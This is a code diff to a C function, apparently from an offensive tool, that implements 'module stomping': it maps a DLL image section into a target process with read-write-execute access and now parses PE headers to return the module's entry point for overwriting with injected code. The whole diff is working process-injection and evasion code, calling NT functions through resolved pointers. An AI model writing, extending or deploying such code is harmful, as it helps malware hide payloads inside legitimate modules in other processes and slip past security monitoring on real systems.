@@ -16,7 +16,8 @@ void* AllocateExecutableMemory(HANDLE hTargetProcess, SIZE_T size) {
 
     HANDLE hSection = NULL;
     // SEC_IMAGE = 0x1000000
-    NTSTATUS status = pfnNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_EXECUTE_READ, 0x1000000, hFile);
+    // Use PAGE_READONLY for SEC_IMAGE coz we only have Generic Read on the file
+    NTSTATUS status = pfnNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, 0x1000000, hFile);
     pfnCloseHandle(hFile);
 
     if (!NT_SUCCESS(status)) {
@@ -28,17 +29,33 @@ void* AllocateExecutableMemory(HANDLE hTargetProcess, SIZE_T size) {
     SIZE_T viewSize = 0;
     HANDLE hProc = (hTargetProcess == (HANDLE)-1) ? GetCurrentProcess() : hTargetProcess;
 
-    status = pfnNtMapViewOfSection(hSection, hProc, &pBaseAddress, 0, 0, NULL, &viewSize, 2, 0, PAGE_EXECUTE_READ);
-    pfnCloseHandle(hSection);
-
+    status = pfnNtMapViewOfSection(hSection, hProc, &pBaseAddress, 0, 0, NULL, &viewSize, 2, 0, PAGE_EXECUTE_READWRITE);
+    
     if (!NT_SUCCESS(status)) {
         DEBUG_PRINT("ModuleStomping: NtMapViewOfSection failed 0x%X", status);
         return NULL;
     }
 
     DEBUG_PRINT("ModuleStomping: Successfully mapped image at %p", pBaseAddress);
+
+    PVOID pLocalBase = NULL;
+    SIZE_T localViewSize = 0;
+    ULONG_PTR entryPointOffset = 0x1000; // Fallback default
     
-    // Offset to .text section (Simplification: Header is 0x1000)
-    // A robust implementation would parse PE headers here.
-    return (void*)((ULONG_PTR)pBaseAddress + 0x1000);
+    NTSTATUS localStatus = pfnNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalBase, 0, 0, NULL, &localViewSize, 2, 0, PAGE_READONLY);
+    
+    if (NT_SUCCESS(localStatus)) {
+        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pLocalBase;
+        if (pDos->e_magic == IMAGE_DOS_SIGNATURE) {
+            PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((ULONG_PTR)pLocalBase + pDos->e_lfanew);
+            if (pNt->Signature == IMAGE_NT_SIGNATURE) {
+                 entryPointOffset = pNt->OptionalHeader.AddressOfEntryPoint;
+            }
+        }
+        pfnNtUnmapViewOfSection(GetCurrentProcess(), pLocalBase);
+    } 
+
+    pfnCloseHandle(hSection);
+    
+    return (void*)((ULONG_PTR)pBaseAddress + entryPointOffset);
 }
